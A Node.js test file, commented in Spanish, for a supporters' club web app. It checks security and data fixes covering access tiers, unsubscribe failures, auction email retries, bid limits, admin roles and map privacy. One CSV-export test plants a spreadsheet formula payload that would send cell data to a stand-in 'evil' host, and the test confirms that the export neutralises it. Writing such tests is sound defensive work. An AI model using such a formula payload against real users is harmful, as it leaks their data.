"use strict";
// Auditoría integral · tanda 1: arreglos verificados de seguridad, datos y operación.
process.env.OLIMPISTAS_PERSIST = "0";
process.env.OLIMPISTAS_DATABASE_URL = "";
process.env.NODE_ENV = "test";
process.env.ADMIN_KEY = "clave-admin-de-prueba";
process.env.CRON_SECRET = "secreto-de-cron-de-prueba";

const { test, before, after } = require("node:test");
const assert = require("node:assert");
const bcrypt = require("bcrypt");
const crypto = require("crypto");
const access = require("../lib/access");
const adminAuth = require("../lib/admin-auth");
const mailer = require("../lib/email");
const app = require("../server");
const { getStore } = require("../data/store");
const store = getStore();

let srv, url;
before(async () => { srv = await new Promise((res) => { const s = app.listen(0, () => res(s)); }); url = `http://127.0.0.1:${srv.address().port}`; });
after(() => srv && srv.close());

const OWNER = { "x-admin-key": "clave-admin-de-prueba" };
const CRON = { "x-cron-token": "secreto-de-cron-de-prueba" };
const api = (ruta, { metodo = "GET", cuerpo, h = {}, crudo } = {}) => fetch(url + "/api" + ruta, { method: metodo, headers: { "Content-Type": "application/json", ...h }, body: crudo !== undefined ? crudo : (cuerpo ? JSON.stringify(cuerpo) : undefined) });
let n = 0;
async function hincha(tier = null, extra = {}) {
  const r = await api("/auth/registro", { metodo: "POST", cuerpo: { email: `t1-${++n}-${Date.now()}@ejemplo.com`, password: "clave-larga-123", nombre: "Hincha", apellido: "Prueba" } });
  const j = await r.json();
  if (tier) await store.setMembresia(j.socio.id, { tierSlug: tier, ciclo: "anio" });
  if (Object.keys(extra).length) await store.updateSocio(j.socio.id, extra);
  return { id: j.socio.id, h: { Authorization: "Bearer " + j.token, Cookie: "olimpista_sess=" + j.token } };
}
async function tokenAdmin(rol) {
  const u = `t1-${rol}-${++n}@ejemplo.com`;
  await adminAuth.crearAdminUsuario({ usuario: u, nombre: u, password: "clave-de-prueba-1", rol });
  const s = await (await api("/admin/login", { metodo: "POST", cuerpo: { usuario: u, password: "clave-de-prueba-1" } })).json();
  return { "x-admin-token": s.token };
}

test("access.nivelAplica: escalonado (un nivel alto alcanza lo de los de abajo) y 'todos' alcanza a cualquiera", () => {
  assert.strictEqual(access.nivelAplica("olimpista", "todos"), true);
  assert.strictEqual(access.nivelAplica("socio", "premium"), true, "Socio alcanza lo de Plus");
  assert.strictEqual(access.nivelAplica("premium", "premium"), true);
  assert.strictEqual(access.nivelAplica("premium", "kids"), true, "Plus alcanza lo de Junior");
  assert.strictEqual(access.nivelAplica("olimpista", "premium"), false);
  assert.strictEqual(access.nivelAplica("kids", "premium,socio"), false);
  assert.strictEqual(access.nivelAplica("socio", "premium,socio"), true);
  assert.strictEqual(access.nivelAplica("premium", ""), true);
});

test("baja de novedades: si no se puede guardar NO se responde 'listo' (500, para que el cliente de correo reintente)", async () => {
  const s = await hincha();
  const u = new URL(mailer.unsubUrl(s.id)).searchParams.get("u");
  const original = store.updateSocio;
  store.updateSocio = async () => { throw new Error("base caída"); };
  try {
    const post = await api("/baja?u=" + encodeURIComponent(u), { metodo: "POST", cuerpo: {} });
    assert.ok(post.status >= 500, "POST one-click con la base caída: " + post.status);
    const get = await fetch(url + "/api/baja?u=" + encodeURIComponent(u));
    assert.ok(get.status >= 500, "GET con la base caída: " + get.status);
  } finally { store.updateSocio = original; }
  const ok = await api("/baja?u=" + encodeURIComponent(u), { metodo: "POST", cuerpo: {} });
  assert.strictEqual(ok.status, 200);
  assert.strictEqual((await store.getSocioById(s.id)).marketing_baja, true);
  // un token inválido no es un error del servidor: 200 sin efecto
  assert.strictEqual((await api("/baja?u=basura.firma", { metodo: "POST", cuerpo: {} })).status, 200);
});

test("ganador de subasta: solo se marca 'notificado' si el correo salió; si falló, el próximo barrido lo reintenta", async () => {
  const ganador = await hincha("premium");
  const sub = await store.crearSubasta({ titulo: "Lote Aviso", precio_inicial: 100000, incremento: 50000, nivel_min: "premium" });
  await store.updateSubasta(sub.id, { estado: "cerrada", ganador_id: ganador.id, adjudicado_a: ganador.id, puja_actual: 150000, termina: new Date(Date.now() - 3600000).toISOString(), notificado: false });
  const original = mailer.enviarSubastaGanador;
  try {
    mailer.enviarSubastaGanador = async () => ({ ok: false });
    await api("/cron/horario", { metodo: "POST", h: CRON, cuerpo: {} });
    assert.ok((await store.subastasSinNotificar()).some((x) => x.id === sub.id), "falló el correo: sigue pendiente");
    mailer.enviarSubastaGanador = async () => { throw new Error("Resend caído"); };
    await api("/cron/horario", { metodo: "POST", h: CRON, cuerpo: {} });
    assert.ok((await store.subastasSinNotificar()).some((x) => x.id === sub.id), "el correo lanzó: sigue pendiente");
    let mandados = 0;
    mailer.enviarSubastaGanador = async () => { mandados++; return { ok: true }; };
    await api("/cron/horario", { metodo: "POST", h: CRON, cuerpo: {} });
    assert.strictEqual(mandados, 1);
    assert.ok(!(await store.subastasSinNotificar()).some((x) => x.id === sub.id), "salió: queda notificado");
    await api("/cron/horario", { metodo: "POST", h: CRON, cuerpo: {} });
    assert.strictEqual(mandados, 1, "y no se manda dos veces");
  } finally { mailer.enviarSubastaGanador = original; }
});

test("pujas: un monto absurdo (2.147.483.647) o negativo se rechaza con 400 antes de tocar la base", async () => {
  const p = await hincha("premium");
  const sub = await store.crearSubasta({ titulo: "Lote Tope", precio_inicial: 100000, incremento: 50000, nivel_min: "premium" });
  await store.updateSubasta(sub.id, { estado: "activa", inicia: new Date().toISOString(), termina: new Date(Date.now() + 3600000).toISOString(), puja_actual: 100000 });
  for (const monto of [2147483647, 9999999999, 300000000, -5]) {
    const r = await api(`/subastas/${sub.id}/pujar`, { metodo: "POST", h: p.h, cuerpo: { monto } });
    assert.strictEqual(r.status, 400, "monto " + monto);
    assert.match((await r.json()).error, /fuera de rango|inválido/);
  }
  assert.strictEqual((await store.getSubasta(sub.id)).puja_actual, 100000, "la subasta no se movió");
  assert.strictEqual((await api(`/subastas/${sub.id}/pujar`, { metodo: "POST", h: p.h, cuerpo: { monto: 150000 } })).status, 200, "una puja normal sigue andando");
});

test("exportes CSV: un nombre que empieza con = + - @ no ejecuta fórmulas en Excel", async () => {
  const marca = "csvi" + Date.now().toString(36);
  const s = await hincha();
  await api("/perfil", { metodo: "PATCH", h: s.h, cuerpo: { nombre: `=HYPERLINK("http://evil/?"&A2,"${marca}")` } });
  const csv = await (await api(`/admin/export/socios.csv?q=${marca}`, { h: OWNER })).text();
  assert.ok(csv.includes(marca), "el hincha está en el export");
  assert.ok(!/(^|,)"=HYPERLINK/m.test(csv), "la celda no empieza con =");
  assert.ok(/"'=HYPERLINK/.test(csv), "queda neutralizada con un apóstrofo");
});

test("comercio en caja: usa el mismo criterio escalonado que ve el hincha (un Socio puede usar lo de Plus)", async () => {
  const c = await store.crearComercio({ nombre: "Comercio Escalonado " + (++n), ciudad: "Asunción", contacto: "c@ejemplo.com" });
  const usuario = "esc" + n + "-" + crypto.randomBytes(2).toString("hex");
  await store.setComercioAcceso(c.id, usuario, await bcrypt.hash("clave-comercio-1", 4));
  const login = await (await api("/comercio/login", { metodo: "POST", cuerpo: { usuario, password: "clave-comercio-1" } })).json();
  const hc = { "x-comercio-token": login.token };
  const ben = await store.crearBeneficio({ comercio_id: c.id, titulo: "10% Plus", valor: "10%", pct: 10, niveles: "premium", activo: true, estado: "aprobado" });
  const socio = await hincha("socio"), plus = await hincha("premium"), libre = await hincha();
  const carnetLib = require("../lib/carnet");
  const qrDe = async (s) => carnetLib.generarToken(s.id, await store.asegurarCarnetSecreto(s.id)).token;
  const validar = async (s) => (await api("/comercio/validar", { metodo: "POST", h: hc, cuerpo: { token: await qrDe(s), beneficioId: ben.id, monto: 50000 } })).json();
  assert.strictEqual((await validar(libre)).motivo, "nivel_no_aplica");
  assert.strictEqual((await validar(plus)).ok, true);
  const rs = await validar(socio);
  assert.strictEqual(rs.ok, true, "un Socio (nivel más alto) también: " + JSON.stringify(rs));
});

test("admin: no se rechaza un pedido ya cobrado ni se vuelve a publicar un lote cerrado o en vivo", async () => {
  const s = await hincha();
  const pagado = await store.createPedidoPago({ socioId: s.id, concepto: "Membresía", monto: 180000, moneda: "PYG", tierSlug: "premium", ciclo: "anio" });
  await store.updatePedidoPago(pagado.id, { estado: "pagado" });
  const r = await api(`/admin/pedidos/${pagado.id}/rechazar`, { metodo: "POST", h: OWNER, cuerpo: {} });
  assert.strictEqual(r.status, 409);
  assert.strictEqual((await store.getPedidoPago(pagado.id)).estado, "pagado", "sigue pagado");
  const pend = await store.createPedidoPago({ socioId: s.id, concepto: "Membresía", monto: 180000, moneda: "PYG", tierSlug: "premium", ciclo: "anio" });
  assert.strictEqual((await api(`/admin/pedidos/${pend.id}/rechazar`, { metodo: "POST", h: OWNER, cuerpo: {} })).status, 200);
  const sub = await store.crearSubasta({ titulo: "Lote Cerrado", precio_inicial: 100000, incremento: 50000, nivel_min: "premium" });
  await store.updateSubasta(sub.id, { estado: "cerrada", ganador_id: s.id, adjudicado_a: s.id, pago_estado: "pagado", puja_actual: 150000 });
  assert.strictEqual((await api(`/admin/subastas/${sub.id}/publicar`, { metodo: "POST", h: OWNER, cuerpo: {} })).status, 409);
  const luego = await store.getSubasta(sub.id);
  assert.strictEqual(luego.adjudicado_a, s.id, "el ganador no se borró");
  assert.strictEqual(luego.pago_estado, "pagado");
  const borrador = await store.crearSubasta({ titulo: "Lote Borrador", precio_inicial: 100000, incremento: 50000, nivel_min: "premium" });
  assert.strictEqual((await api(`/admin/subastas/${borrador.id}/publicar`, { metodo: "POST", h: OWNER, cuerpo: {} })).status, 200);
});

test("admin: la búsqueda de hinchas (email y cédula) es de la sección Hinchas: la CD y el rol comercial no entran", async () => {
  await hincha();
  for (const rol of ["cd", "comercial"]) {
    const r = await api("/admin/buscar?q=ejemplo", { h: await tokenAdmin(rol) });
    assert.strictEqual(r.status, 403, rol);
  }
  for (const rol of ["soporte", "owner"]) {
    const r = await api("/admin/buscar?q=ejemplo", { h: rol === "owner" ? OWNER : await tokenAdmin(rol) });
    assert.strictEqual(r.status, 200, rol);
  }
  assert.strictEqual((await api("/admin/buscar?q=ejemplo", { h: await tokenAdmin("marketing") })).status, 200, "marketing ve Hinchas");
});

test("errores del servidor: JSON malformado o enorme responde JSON claro (400/413), no HTML", async () => {
  const mal = await api("/auth/login", { metodo: "POST", crudo: "{esto no es json" });
  assert.strictEqual(mal.status, 400);
  assert.match(mal.headers.get("content-type") || "", /json/);
  assert.match((await mal.json()).error, /JSON/);
  const grande = await api("/auth/login", { metodo: "POST", crudo: JSON.stringify({ email: "a@b.com", password: "x".repeat(2 * 1024 * 1024) }) });
  assert.strictEqual(grande.status, 413);
  assert.match(grande.headers.get("content-type") || "", /json/);
});

test("mapa: /flags ya no entrega casas, y las celdas se calculan sobre todos los puntos (mover el recuadro no delata a nadie)", async () => {
  const h3 = require("h3-js");
  const base = h3.latLngToCell(-25.62, -57.11, 9);
  const [la, lo] = h3.cellToLatLng(base);
  const vecina = h3.gridDisk(base, 1).find((c) => c !== base), [lb, lob] = h3.cellToLatLng(vecina);
  const mk = async (lat, lng) => { const s = await store.createSocio({ email: `cel${++n}-${Date.now()}@ejemplo.com`, passwordHash: "x", nombre: "C" }); await store.updateSocio(s.id, { lat, lng, mostrar_exacto: true }); };
  await mk(la, lo); await mk(la, lo); await mk(lb, lob); // 2 + 1 en celdas vecinas → solo existe como barrio res 8 con n=3 si comparten padre
  const cel = (b) => fetch(`${url}/api/mapa/celdas?bbox=${b}`).then((r) => r.json());
  const todo = await cel(`${lo - 0.05},${la - 0.05},${lo + 0.05},${la + 0.05}`);
  // un recuadro que deja afuera a 1 de los 3 puntos NO cambia lo que se ve de una celda cuyo centro está adentro
  const recorte = await cel(`${lo - 0.0001},${la - 0.0001},${lo + 0.0001},${la + 0.0001}`);
  for (const c of recorte.celdas) assert.ok(todo.celdas.some((x) => x.c === c.c && x.n === c.n), "la celda del recorte es la misma que en el recuadro grande");
  assert.deepStrictEqual((await fetch(`${url}/api/flags?bbox=-58,-26,-57,-25`).then((r) => r.json())).flags, []);
});
